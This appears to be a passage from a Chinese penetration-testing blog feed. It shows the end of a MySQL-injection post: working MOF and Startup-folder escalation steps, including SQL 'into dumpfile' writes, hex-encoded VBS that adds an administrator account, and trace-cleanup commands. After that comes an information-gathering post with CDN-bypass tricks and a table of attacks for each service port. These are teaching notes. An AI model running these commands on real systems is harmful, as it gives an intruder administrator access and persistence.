hacker P@ssw0rd &#x2F;add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker &#x2F;add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   &#x3D; $Consumer; </span><br><span class="line">    Filter &#x3D; $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>MySQL 写文件的特性将这个 MOF 文件导入到 C:/Windows/system32/wbem/mof/ 目录下，依然采用上述编码的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select 0xinto dumpfile &quot;C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;test.mof&quot;;</span><br></pre></td></tr></table></figure><p>执行成功的的时候，test.mof 会出现在：c:/windows/system32/wbem/goog/ 目录下 否则出现在 c:/windows/system32/wbem/bad 目录下</p><p>痕迹清理：因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 停止 winmgmt 服务</span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"># 删除 Repository 文件夹</span><br><span class="line">rmdir &#x2F;s &#x2F;q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"># 手动删除 mof 文件</span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof &#x2F;F &#x2F;S</span><br><span class="line"></span><br><span class="line"># 删除创建的用户</span><br><span class="line">net user hacker &#x2F;delete</span><br><span class="line"></span><br><span class="line"># 重新启动服务</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure><h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><p>这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。</p><ul><li><p>启动项路径</p></li><li><p>Windows Server 2003 的启动项路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">中文系统</span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</span><br><span class="line">C:\Documents and Settings\All Users\「开始」菜单\程序\启动</span><br><span class="line"></span><br><span class="line">英文系统</span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line">开关机项 需要自己建立对应文件夹</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br></pre></td></tr></table></figure></li><li><p>Windows Server 2008 的启动项路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure></li><li><p>既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set WshShell&#x3D;WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">WshShell.Run &quot;net user hacker P@ssw0rd &#x2F;add&quot;, 0</span><br><span class="line">WshShell.Run &quot;net localgroup administrators hacker &#x2F;add&quot;, 0</span><br></pre></td></tr></table></figure></li><li><p>MySQL 写入启动项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select 0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&quot;;</span><br><span class="line">写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;h1 id=&quot;MYSQL注入&quot;&gt;&lt;a href=&quot;#MYSQL注入&quot; class=&quot;headerlink&quot; title=&quot;MYSQL注入&quot;&gt;&lt;/a&gt;MYSQL注入&lt;/h1&gt;&lt;h2 id=&quot;Sql-注入介绍&quot;&gt;&lt;a href=&quot;#Sql-注入介绍&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="Web安全" scheme="https://kb-at-zero.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="渗透测试" scheme="https://kb-at-zero.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="Sql注入" scheme="https://kb-at-zero.github.io/tags/Sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Web安全-信息收集</title>
    <link href="https://kb-at-zero.github.io/2021/04/18/Web%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://kb-at-zero.github.io/2021/04/18/Web%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-04-18T06:04:00.000Z</published>
    <updated>2021-04-20T05:47:37.529Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>在平常的渗透测试的过程中，最重要也是最首要的一步就是信息收集，在这个阶段我们要尽可能的收集目标组织的信息，所谓“知己知彼、百战不殆”，我们越是了解目标，渗透起来就越容易。</p><h2 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h2><ul><li>whois 查询<ul><li>whois是一个标准的互联网协议，可用于收集网络注册信息，域名的注册、IP地址等信息。可以用于查询域名是否已被注册以及注册域名的详细信息的数据库（域名所有人、域名注册商等）。在whois查询中，得到注册人的姓名和邮箱可以用于后期通过搜索引擎、社交网站爆破字典等，一般的小站点域名的所有人往往就是管理员。</li><li>kali系统下whois默认安装：whois example.domain<br><img src="/images/pasted-0.png" alt="upload successful"></li><li>爱站工具网：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></li><li>站长之家：<a href="https://whois.chinaz.com/">https://whois.chinaz.com</a></li><li>VirusTotal：<a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li></ul></li><li>备案信息查询<ul><li>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com</a></li><li>天眼查：<a href="http://www.tianyancha.com/">http://www.tianyancha.com</a></li></ul></li></ul><h2 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h2><ul><li>Google搜索敏感信息<br><img src="/images/pasted-1.png" alt="upload successful"></li><li>GitHub搜索敏感信息：寻找相关敏感信息，如数据库连接信息、邮箱密码、uc-key、阿里的osskey，有时还可以找到泄露的源代码等</li><li>乌云等漏洞平台搜索历史漏洞信息</li><li>云盘搜索：<a href="https://www.chaonengsou.com/">https://www.chaonengsou.com/</a></li></ul><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul><li>oneforall：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a> （需配置api接口，运行时翻墙效果最佳）</li><li>Layer子域名挖掘机：<a href="https://www.webshell.cc/6384.html">https://www.webshell.cc/6384.html</a></li><li>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li><li>subDomainBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li><li>在线子域名枚举：<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a> 、<a href="https://dns.aizhan.com/">https://dns.aizhan.com</a></li><li>空间搜索引擎：fofa（证书、title、icon等）、shodan、钟馗之眼、傻蛋</li><li>搜索引擎：Google、百度、bing等</li><li>第三方聚合应用枚举：<a href="https://dnsdumpster.com/">https://dnsdumpster.com</a></li></ul><h2 id="常用端口信息"><a href="#常用端口信息" class="headerlink" title="常用端口信息"></a>常用端口信息</h2><ul><li>常用工具<ul><li>Nmap</li><li>御剑高速TCP端口扫描</li><li>Masscan</li><li>ZMap</li><li>Goby</li></ul></li></ul><table><thead><tr><th>端口</th><th>服务</th><th>入侵方式</th></tr></thead><tbody><tr><td>21</td><td>ftp/tftp/vsftpd文件传输协议</td><td>爆破/嗅探/溢出/后门/下载</td></tr><tr><td>22</td><td>ssh远程连接</td><td>爆破/openssh漏洞</td></tr><tr><td>23</td><td>Telnet远程连接</td><td>爆破/嗅探/弱口令</td></tr><tr><td>25</td><td>SMTP邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS域名解析系统</td><td>域传送/劫持/缓存投毒/欺骗</td></tr><tr><td>67/68</td><td>dhcp服务</td><td>劫持/欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破/嗅探</td></tr><tr><td>139</td><td>Samba服务</td><td>爆破/未授权访问/远程命令执行</td></tr><tr><td>143</td><td>Imap协议</td><td>爆破</td></tr><tr><td>161</td><td>SNMP协议</td><td>爆破/搜集目标内网信息</td></tr><tr><td>389</td><td>Ldap目录访问协议</td><td>注入/未授权访问/弱口令</td></tr><tr><td>445</td><td>smb</td><td>ms17-010/端口溢出</td></tr><tr><td>512/513/514</td><td>Linux Rexec服务</td><td>爆破/Rlogin登陆</td></tr><tr><td>873</td><td>Rsync服务</td><td>文件上传/未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破</td></tr><tr><td>1352</td><td>Lotus domino邮件服务</td><td>爆破/信息泄漏</td></tr><tr><td>1433</td><td>mssql</td><td>爆破/注入/SA弱口令</td></tr><tr><td>1521</td><td>oracle</td><td>爆破/注入/TNS爆破/反弹shell</td></tr><tr><td>2049</td><td>Nfs服务</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper服务</td><td>未授权访问</td></tr><tr><td>2375</td><td>docker remote api</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破/注入</td></tr><tr><td>3389</td><td>Rdp远程桌面链接</td><td>爆破/shift后门</td></tr><tr><td>4848</td><td>GlassFish控制台</td><td>爆破/认证绕过</td></tr><tr><td>5000</td><td>sybase/DB2数据库</td><td>爆破/注入/提权</td></tr><tr><td>5432</td><td>postgresql</td><td>爆破/注入/缓冲区溢出</td></tr><tr><td>5632</td><td>pcanywhere服务</td><td>抓密码/代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破/认证绕过</td></tr><tr><td>6379</td><td>Redis数据库</td><td>未授权访问/爆破</td></tr><tr><td>7001/7002</td><td>weblogic</td><td>java反序列化/控制台弱口令</td></tr><tr><td>80/443</td><td>http/https</td><td>web应用漏洞/心脏滴血</td></tr><tr><td>8069</td><td>zabbix服务</td><td>远程命令执行/注入</td></tr><tr><td>8161</td><td>activemq</td><td>弱口令/写文件</td></tr><tr><td>8080/8089</td><td>Jboss/Tomcat/Resin</td><td>爆破/PUT文件上传/反序列化</td></tr><tr><td>8083/8086</td><td>influxDB</td><td>未授权访问</td></tr><tr><td>9000</td><td>fastcgi</td><td>远程命令执行</td></tr><tr><td>9090</td><td>Websphere控制台</td><td>爆破/java反序列化/弱口令</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcached</td><td>未授权访问</td></tr><tr><td>27017/27018</td><td>mongodb</td><td>未授权访问/爆破</td></tr></tbody></table><ul><li>web服务类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">tomcat--80&#x2F;8080&#x2F;8009</span><br><span class="line">           manager弱口令</span><br><span class="line">           put上传webshell</span><br><span class="line">           HTTP慢速攻击</span><br><span class="line">           ajr文件包含漏洞-CVE-2020-1938</span><br><span class="line">Jboss--8080</span><br><span class="line">           后台弱口令</span><br><span class="line">           console后台部署war包</span><br><span class="line">           JAVA反序列化</span><br><span class="line">           远程代码执行</span><br><span class="line">webSphere--9080</span><br><span class="line">               后台弱口令</span><br><span class="line">               任意文件泄露</span><br><span class="line">               JAVA反序列化</span><br><span class="line">weblogic--7001&#x2F;7002</span><br><span class="line">                   后台弱口令</span><br><span class="line">                   console后台部署war包</span><br><span class="line">                   SSRF</span><br><span class="line">                   测试页面上传webshell</span><br><span class="line">                           JAVA反序列化</span><br><span class="line">                               CVE-2018-2628</span><br><span class="line">                               CVE-2018-2893</span><br><span class="line">                               CVE-2017-10271</span><br><span class="line">                               CVE-2019-2725</span><br><span class="line">                               CVE-2019-2729</span><br><span class="line">Glassfish--8080&#x2F;4848</span><br><span class="line">                     暴力破解</span><br><span class="line">                     任意文件读取</span><br><span class="line">                     认证绕过</span><br><span class="line">Jetty--8080</span><br><span class="line">           远程共享缓冲区溢出</span><br><span class="line">Apache--80&#x2F;8080</span><br><span class="line">               HTTP慢速攻击</span><br><span class="line">               解析漏洞</span><br><span class="line">               目录遍历</span><br><span class="line">ApacheSolr--8983</span><br><span class="line">               远程命令执行</span><br><span class="line">               CVE-2017-12629</span><br><span class="line">               CVE-2019-0193</span><br><span class="line">IIS--80</span><br><span class="line">               put上传webshell</span><br><span class="line">               IIS解析漏洞</span><br><span class="line">               IIS提权</span><br><span class="line">               IIS远程远程代码执行-CVE-2017-7269</span><br><span class="line">Resin--8080</span><br><span class="line">               目录遍历</span><br><span class="line">               远程文件读取</span><br><span class="line">Axis2--8080</span><br><span class="line">           后台弱口令</span><br><span class="line">Lutos--1352</span><br><span class="line">           后台弱口令</span><br><span class="line">           信息泄露</span><br><span class="line">           跨站脚本攻击</span><br><span class="line">Nginx--80&#x2F;443</span><br><span class="line">           HTTP慢速攻击</span><br><span class="line">           解析漏洞</span><br></pre></td></tr></table></figure><ul><li>数据库类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Mysql--3306</span><br><span class="line">            弱口令</span><br><span class="line">            身份认证漏洞-cve-2012-2122</span><br><span class="line">            拒绝服务攻击</span><br><span class="line">            phpmyadmin万能密码or弱口令</span><br><span class="line">            UDF&#x2F;MOF提权</span><br><span class="line">Mssql--1433</span><br><span class="line">            弱口令</span><br><span class="line">            存储过程提权</span><br><span class="line">Oralce--1521</span><br><span class="line">            弱口令</span><br><span class="line">            TNS漏洞</span><br><span class="line">Redis--6379</span><br><span class="line">            弱口令</span><br><span class="line">            未经授权访问</span><br><span class="line">PostgreSQL--5432</span><br><span class="line">            弱口令</span><br><span class="line">            缓冲区溢出-cve-2014-2669</span><br><span class="line">MongoDB--27001</span><br><span class="line">            弱口令</span><br><span class="line">            未经授权访问</span><br><span class="line">DB2--5000</span><br><span class="line">            安全限制绕过进行未经授权操作-cve-2015-1922</span><br><span class="line">SysBase--5000&#x2F;4100</span><br><span class="line">            弱口令</span><br><span class="line">            命令注入</span><br><span class="line">Memcache--11211</span><br><span class="line">            未经授权访问</span><br><span class="line">            配置漏洞</span><br><span class="line">ElasticSearch--9200&#x2F;9300</span><br><span class="line">            未经授权访问</span><br><span class="line">            远程代码执行</span><br><span class="line">            文件办理</span><br><span class="line">            写入webshell</span><br></pre></td></tr></table></figure><ul><li>大数据类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hadoop--50010</span><br><span class="line">              远程命令执行</span><br><span class="line">Zookeeper--2181</span><br><span class="line">              未经授权访问</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>文件共享</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Ftp--21</span><br><span class="line">        弱口令</span><br><span class="line">        匿名访问</span><br><span class="line">        上传后门</span><br><span class="line">        远程溢出</span><br><span class="line">        跳转攻击</span><br><span class="line">NFS--2049</span><br><span class="line">        未经授权访问</span><br><span class="line">Samba--137</span><br><span class="line">        弱口令</span><br><span class="line">        未经授权访问</span><br><span class="line">        远程代码执行-CVE-2015-0240</span><br><span class="line">LDAP--389</span><br><span class="line">        弱口令</span><br><span class="line">        注入</span><br><span class="line">        未经授权访问</span><br></pre></td></tr></table></figure><ul><li>远程访问</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SSH--22</span><br><span class="line">            弱口令</span><br><span class="line">            28退格漏洞</span><br><span class="line">            OpenSSL漏洞</span><br><span class="line">            用户名枚举</span><br><span class="line">Telent--23</span><br><span class="line">            弱口令</span><br><span class="line">RDP--3389</span><br><span class="line">            弱口令</span><br><span class="line">            Shitf粘滞键后门</span><br><span class="line">            缓冲区溢出</span><br><span class="line">            MS12-020</span><br><span class="line">            CVE-2019-0708</span><br><span class="line">VNC--5901</span><br><span class="line">            弱口令</span><br><span class="line">            认证口令绕过</span><br><span class="line">            拒绝服务攻击-CVE-2015-5239</span><br><span class="line">            权限提升-CVE-2013-6886</span><br><span class="line">Pcanywhere--5632</span><br><span class="line">            拒绝服务攻击</span><br><span class="line">            权限提升</span><br><span class="line">            代码执行</span><br><span class="line">X11--6000</span><br><span class="line">            未经授权访问-CVE-1999-0526</span><br></pre></td></tr></table></figure><ul><li>邮件服务</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SMTP--25&#x2F;465</span><br><span class="line">            弱口令</span><br><span class="line">            未经授权访问</span><br><span class="line">            邮件伪造</span><br><span class="line">POP3--110&#x2F;995</span><br><span class="line">            弱口令</span><br><span class="line">            未经授权访问</span><br><span class="line">IMAP--143&#x2F;993</span><br><span class="line">            弱口令</span><br><span class="line">            任意文件读取</span><br></pre></td></tr></table></figure><ul><li>其他服务</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DNS--53</span><br><span class="line">            DNS区域传输</span><br><span class="line">            DNS劫持</span><br><span class="line">            DNS欺骗</span><br><span class="line">            DNS缓存投毒</span><br><span class="line">            DNS隧道</span><br><span class="line">DHCP--67&#x2F;68</span><br><span class="line">            DHCP劫持</span><br><span class="line">            DHCP欺骗</span><br><span class="line">SNMP--161</span><br><span class="line">            弱口令</span><br><span class="line">Rlogin--512&#x2F;513&#x2F;514</span><br><span class="line">            rlogin登录</span><br><span class="line">Rsync--873</span><br><span class="line">            未经授权访问</span><br><span class="line">            本地权限提升</span><br><span class="line">Zabbix--8069</span><br><span class="line">            远程命令执行</span><br><span class="line">RMI--1090&#x2F;1099</span><br><span class="line">            JAVA反序列化</span><br><span class="line">Docker--2375</span><br><span class="line">            未经授权访问</span><br></pre></td></tr></table></figure><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。对目标渗透测试过程中，目标的cms是十分重要的信息，有了目标的cms，就可以利用相关bug进行测试，进行代码审计等。</p><ul><li>在指纹识别的学习过程中，有很多开源的工具和指纹库，如fofa、WhatWeb、w11scan、WebEye、御剑Web指纹识别、WebRobo、椰树、轻量web指纹识别</li><li>在线网站查询：<ul><li>BugScaner：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></li><li>云悉指纹：<a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></li><li>WhatWeb：<a href="https://whatweb.net/">https://whatweb.net</a></li><li>Wapplyzer插件</li></ul></li><li>识别方式</li></ul><table><thead><tr><th>识别方式</th></tr></thead><tbody><tr><td>网站特有文件：如/templets/default/style/dedecms.css—dedecms</td></tr><tr><td>网站独有文件的md5：如favicon.ico，但是该文件可以被修改导致不准确。</td></tr><tr><td>网站文件命名规则</td></tr><tr><td>返回头的关键字</td></tr><tr><td>网页关键字：如/data/sessions/index.html——dedecms</td></tr><tr><td>Url特征</td></tr><tr><td>Meta特征</td></tr><tr><td>Script特征</td></tr><tr><td>robots.txt</td></tr><tr><td>网站路径特征</td></tr><tr><td>网站静态资源</td></tr><tr><td>爬虫网站目录信息</td></tr></tbody></table><h2 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h2><p>对应给定的目标，例如一个网站，首先获得的是目标域名，下一步就是找到域名背后的服务器ip，由于当前网站大多使用CDN（内容分发网络）对网站访问流量进行分流和一定程度的攻击防护，所以找出CDN背后的服务器真实ip就是一种“刚需”了。</p><ul><li>验证是否有CDN<ul><li>ping和nslookup（解析对应多个 IP 地址）</li><li>多地 ping 服务（IP 地址不唯一）：<ul><li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></li><li><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></li><li><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></li></ul></li></ul></li><li>绕过 CDN 查找网站真实 IP<ul><li>查询历史DNS记录<ul><li>1、查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<ul><li><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> ###DNS查询</li><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> ###微步在线</li><li><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a> ###在线域名信息查询</li><li><a href="http://viewdns.info/">http://viewdns.info/</a> ###DNS、IP等查询</li><li><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a> ###CDN查询IP</li></ul></li><li>2、利用SecurityTrails（<a href="https://securitytrails.com/">https://securitytrails.com/</a> ） 平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</li></ul></li><li>查询子域名：毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。常用查找子域名方法有：微步在线(<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> )、 Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> )、 Google 搜索（Google site:baidu.com -www就能查看除www外的子域名）、各种子域名扫描器。</li><li>搜索引擎：常见的有以前的钟馗之眼，shodan，fofa搜索。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。</li><li>利用SSL证书寻找真实原始IP：对于目标网站的SSL证书，要查找其使用的IPv4主机，只需将”SHA1 fingerprint”（签名证书的sha1值）粘贴到Censys IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器。</li><li>利用HTTP标头寻找真实原始IP：借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</li><li>利用网站返回的内容寻找真实原始IP：如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</li><li>使用国外主机解析域名。</li><li>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</li><li>网站漏洞查找：<ul><li>1、目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。</li><li>2、XSS盲打，命令执行反弹shell，SSRF等。</li><li>3、无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</li></ul></li><li>网站邮件订阅查找：RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</li><li>用 Zmap 扫全网：需要找 xiaix.me 网站的真实 IP，我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me。</li><li>F5 LTM解码法：当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</li></ul></li></ul><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" 